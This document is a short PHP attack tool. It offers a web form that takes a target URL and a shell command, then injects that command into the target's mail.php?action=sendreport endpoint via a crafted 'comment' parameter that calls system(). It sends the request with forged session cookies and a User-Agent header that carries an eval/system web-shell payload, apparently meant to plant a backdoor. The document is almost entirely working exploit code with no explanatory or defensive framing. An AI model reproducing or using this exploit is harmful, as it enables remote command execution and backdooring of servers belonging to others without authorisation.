<form action="" method="post" name="arz3">
 Site : <input value="<? echo $_POST[site]; ?>" type="text" name="site" />
 Command : <input value="" type="text" name="cmd" />
 <input type="submit" name="aa" value = "Go" />
 </form> 
 <?
 $url = $_POST[site];$cmd = $_POST[cmd];$inj = 'comment=xxxxx'.'";exit(system('."'";$inj .= $cmd;$inj .="'".')); echo "';echo login("$url/mail.php?action=sendreport",$inj);exit();function login($url,$data){        $fp = fopen("cookie.txt", "w");        fclose($fp);        $login = curl_init();        curl_setopt($login, CURLOPT_COOKIE, "PHPSESSID=be7e0ba5dc22e36b19c118936472c94b; userid=1; pass=$hash");        curl_setopt($login, CURLOPT_COOKIEJAR, "cookie.txt");        curl_setopt($login, CURLOPT_COOKIEFILE, "cookie.txt");        curl_setopt($login, CURLOPT_TIMEOUT, 40000);        curl_setopt($login, CURLOPT_RETURNTRANSFER, TRUE);        curl_setopt($login, CURLOPT_URL, $url);        curl_setopt($login, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']."<?eval(system($_GET[cmd])); ?>");        curl_setopt($login, CURLOPT_FOLLOWLOCATION, TRUE);        curl_setopt($login, CURLOPT_POST, TRUE);        curl_setopt($login, CURLOPT_POSTFIELDS, $data);        ob_start();        return curl_exec ($login);        ob_end_clean();        curl_close ($login);        unset($login); }?>
